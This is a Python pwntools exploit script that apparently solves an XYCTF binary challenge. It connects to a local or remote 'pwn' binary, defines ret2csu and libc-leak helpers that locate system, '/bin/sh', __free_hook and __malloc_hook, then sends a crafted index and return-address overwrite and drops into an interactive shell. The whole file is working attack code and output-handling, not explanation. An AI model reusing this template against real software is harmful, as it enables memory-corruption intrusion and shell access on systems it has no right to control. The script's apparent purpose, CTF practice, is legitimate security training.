from pwn import*
from LibcSearcher import*
from ctypes import*
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
jude = 2
if jude == 1:
    node = 'xyctf.top'
    num = 56915
    r = remote(node,num)
else:
    r = process('./pwn')
system_adr = 0
bin_sh = 0
libc_base = 0
def ret2csu(pop_addr,mov_adr,fun_addr,rdi,rsi,rdx):
    p = p64(pop_addr)
    p += p64(0) + p64(1) + p64(fun_addr) +p64(rdi) +p64(rsi) +p64(rdx) +p64(mov_adr)
    p += b'a'*56
    return p

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
 
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
 
def s(a):
 
    r.send(a)
 
def sa(a, b):
 
    r.sendafter(a, b)
 
def sl(a):
 
    r.sendline(a)
 
def sla(a, b):
 
    r.sendlineafter(a, b)
 
def rv(num):
 
    return r.recv(num)
 
def pr():
 
    print(p.recv())
 
def rl(a):
 
    return r.recvuntil(a)
 
def inter():
 
    r.interactive()
 
context(os='linux', arch='amd64', log_level='debug')
 
def g():

    gdb.attach(r)
def get_addr(arch):
    if arch == 64:
        return u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
    else:
        return u32(r.recvuntil(b'\xf7'))

def leaklibc(way,func_adr,name,libc):
    if way == 'LibcSearcher':
        libc = LibcSearcher('name',func_adr)
        libc_base = func_adr - libc.dump(name)
        system_adr = libc_base + libc.dump('system')
        bin_sh = libc_base + libc.dump('str_bin_sh')
    else:
        libc_base = func_adr - libc.sym[name]
        system_adr = libc_base + libc.sym['system']
        bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    return libc_base , system_adr ,bin_sh
def heaplibc(libc_base,libc):
    system_adr = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    free_hook = libc_base + libc.sym['__free_hook']
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    return system_adr,bin_sh,free_hook,malloc_hook
back = 0x40133A
rl(b"please enter your name and id")
rl(b"index")
sl(b'32')
rl(b"name:")
p = b'a'*8 + p64(back)
g()
s(p)
rl(b"id:")
sl(b"144")
rl(b"index")
sl(b'-1')
r.interactive()

